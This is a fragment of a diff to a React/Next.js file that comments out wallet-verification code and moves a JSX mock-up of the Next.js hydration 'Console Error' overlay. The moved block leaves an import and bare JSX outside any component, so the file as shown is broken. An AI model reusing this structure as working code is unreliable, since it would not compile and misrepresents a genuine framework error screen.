-  } finally {
-    setProcessing(false);
-  }
-};
+//     toast.error("Failed to verify wallet", {
+//       description: error?.message || "Connection failed",
+//     });
+//   } finally {
+//     setProcessing(false);
+//   }
+// };
 
-import { ChevronRight, Copy, BookOpen, Box } from "lucide-react";
- <div className="min-h-screen bg-[#050505] flex items-center justify-center p-8">
-      <div className="relative w-full max-w-6xl overflow-hidden rounded-3xl border border-white/10 bg-[#111111] shadow-[0_0_50px_rgba(0,0,0,.7)]">
 
-        {/* Top Bar */}
-        <div className="flex items-center justify-between border-b border-white/10 px-6 py-4">
-
-          {/* Left */}
-          <div className="flex items-center gap-3">
-            <button className="flex h-9 w-9 items-center justify-center rounded-full bg-white/5 hover:bg-white/10">
-              ←
-            </button>
-
-            <span className="text-sm font-semibold text-zinc-400">
-              1/2
-            </span>
-
-            <button className="flex h-9 w-9 items-center justify-center rounded-full bg-white/5 hover:bg-white/10">
-              →
-            </button>
-          </div>
-
-          {/* Right */}
-          <div className="rounded-full border border-white/10 bg-[#181818] px-4 py-2 text-sm text-zinc-400">
-            <span className="mr-2 inline-block h-2.5 w-2.5 rounded-full bg-orange-400" />
-            Next.js 16.0.10 (stale)
-            <span className="ml-1 text-violet-400">Turbopack</span>
-          </div>
-        </div>
-
-        {/* Body */}
-        <div className="space-y-8 p-8">
-
-          {/* Badge */}
-          <div>
-            <span className="rounded-md bg-[#3B1718] px-3 py-2 text-sm font-semibold text-[#FF6B6B]">
-              Console Error
-            </span>
-          </div>
-
-          {/* Error Title */}
-          <h2 className="max-w-5xl text-[30px] font-semibold leading-snug text-[#FF6B6B]">
-            A tree hydrated but some attributes of the server rendered HTML
-            didn't match the client properties. This won't be patched up.
-            This can happen if a SSR-ed Client Component used:
-          </h2>
-
-          {/* List */}
-          <div className="space-y-2 text-lg leading-8 text-zinc-400">
-            <p>- A server/client branch if (typeof window !== "undefined").</p>
-            <p>- Variable input such as Date.now() or Math.random().</p>
-            <p>- Date formatting in a user's locale.</p>
-            <p>- External changing data without sending a snapshot.</p>
-            <p>- Invalid HTML tag nesting.</p>
-          </div>
-
-          <p className="text-lg leading-8 text-zinc-400">
-            It can also happen if the client has a browser extension installed
-            which messes with the HTML before React loaded.
-          </p>
-
-          {/* Link */}
-          <div className="text-lg">
-            <span className="font-semibold text-white">
-              See more info here:
-            </span>{" "}
-            <a
-              href="#"
-              className="text-[#4EA8FF] hover:underline"
-            >
-              https://nextjs.org/docs/messages/react-hydration-error
-            </a>
-          </div>
-
-          {/* Code Block */}
-          <div className="overflow-hidden rounded-2xl border border-white/10 bg-black">
-
-            <div className="flex items-center justify-between border-b border-white/10 px-5 py-4">
-
-              <ChevronRight className="text-zinc-400" size={18} />
-
-              <div className="flex gap-3">
-
-                <button className="rounded-lg p-2 hover:bg-white/5">
-                  <Copy size={18} className="text-zinc-500" />
-                </button>
-
-                <button className="rounded-lg p-2 hover:bg-white/5">
-                  <BookOpen size={18} className="text-zinc-500" />
-                </button>
-
-                <button className="rounded-lg p-2 hover:bg-white/5">
-                  <Box size={18} className="text-zinc-500" />
-                </button>
-
-              </div>
-            </div>
-
-            <pre className="overflow-x-auto p-6 font-mono text-[15px] leading-7 text-zinc-300">
-{`<input
-  placeholder="Search..."
-  className="bg-transparent text-sm text-gray-300 outline-none w-32"
-  fdprocessedid="vxy8b"
-/>`}
-            </pre>
-
-            <div className="h-8 bg-[#5B2224]" />
-          </div>
-
-        </div>
-      </div>
-    </div>
   
 
 //   if (!walletAddress) {
@@ -1039,3 +928,117 @@ import { ChevronRight, Copy, BookOpen, Box } from "lucide-react";
 //     </div>
 //   )
 // }
+
+
+import { ChevronRight, Copy, BookOpen, Box } from "lucide-react";
+ <div className="min-h-screen bg-[#050505] flex items-center justify-center p-8">
+      <div className="relative w-full max-w-6xl overflow-hidden rounded-3xl border border-white/10 bg-[#111111] shadow-[0_0_50px_rgba(0,0,0,.7)]">
+
+        {/* Top Bar */}
+        <div className="flex items-center justify-between border-b border-white/10 px-6 py-4">
+
+          {/* Left */}
+          <div className="flex items-center gap-3">
+            <button className="flex h-9 w-9 items-center justify-center rounded-full bg-white/5 hover:bg-white/10">
+              ←
+            </button>
+
+            <span className="text-sm font-semibold text-zinc-400">
+              1/2
+            </span>
+
+            <button className="flex h-9 w-9 items-center justify-center rounded-full bg-white/5 hover:bg-white/10">
+              →
+            </button>
+          </div>
+
+          {/* Right */}
+          <div className="rounded-full border border-white/10 bg-[#181818] px-4 py-2 text-sm text-zinc-400">
+            <span className="mr-2 inline-block h-2.5 w-2.5 rounded-full bg-orange-400" />
+            Next.js 16.0.10 (stale)
+            <span className="ml-1 text-violet-400">Turbopack</span>
+          </div>
+        </div>
+
+        {/* Body */}
+        <div className="space-y-8 p-8">
+
+          {/* Badge */}
+          <div>
+            <span className="rounded-md bg-[#3B1718] px-3 py-2 text-sm font-semibold text-[#FF6B6B]">
+              Console Error
+            </span>
+          </div>
+
+          {/* Error Title */}
+          <h2 className="max-w-5xl text-[30px] font-semibold leading-snug text-[#FF6B6B]">
+            A tree hydrated but some attributes of the server rendered HTML
+            didn't match the client properties. This won't be patched up.
+            This can happen if a SSR-ed Client Component used:
+          </h2>
+
+          {/* List */}
+          <div className="space-y-2 text-lg leading-8 text-zinc-400">
+            <p>- A server/client branch if (typeof window !== "undefined").</p>
+            <p>- Variable input such as Date.now() or Math.random().</p>
+            <p>- Date formatting in a user's locale.</p>
+            <p>- External changing data without sending a snapshot.</p>
+            <p>- Invalid HTML tag nesting.</p>
+          </div>
+
+          <p className="text-lg leading-8 text-zinc-400">
+            It can also happen if the client has a browser extension installed
+            which messes with the HTML before React loaded.
+          </p>
+
+          {/* Link */}
+          <div className="text-lg">
+            <span className="font-semibold text-white">
+              See more info here:
+            </span>{" "}
+            <a
+              href="#"
+              className="text-[#4EA8FF] hover:underline"
+            >
+              https://nextjs.org/docs/messages/react-hydration-error
+            </a>
+          </div>
+
+          {/* Code Block */}
+          <div className="overflow-hidden rounded-2xl border border-white/10 bg-black">
+
+            <div className="flex items-center justify-between border-b border-white/10 px-5 py-4">
+
+              <ChevronRight className="text-zinc-400" size={18} />
+
+              <div className="flex gap-3">
+
+                <button className="rounded-lg p-2 hover:bg-white/5">
+                  <Copy size={18} className="text-zinc-500" />
+                </button>
+
+                <button className="rounded-lg p-2 hover:bg-white/5">
+                  <BookOpen size={18} className="text-zinc-500" />
+                </button>
+
+                <button className="rounded-lg p-2 hover:bg-white/5">
+                  <Box size={18} className="text-zinc-500" />
+                </button>
+
+              </div>
+            </div>
+
+            <pre className="overflow-x-auto p-6 font-mono text-[15px] leading-7 text-zinc-300">
+{`<input
+  placeholder="Search..."
+  className="bg-transparent text-sm text-gray-300 outline-none w-32"
+  fdprocessedid="vxy8b"
+/>`}
+            </pre>
+
+            <div className="h-8 bg-[#5B2224]" />
+          </div>
+
+        </div>
+      </div>
+    </div>
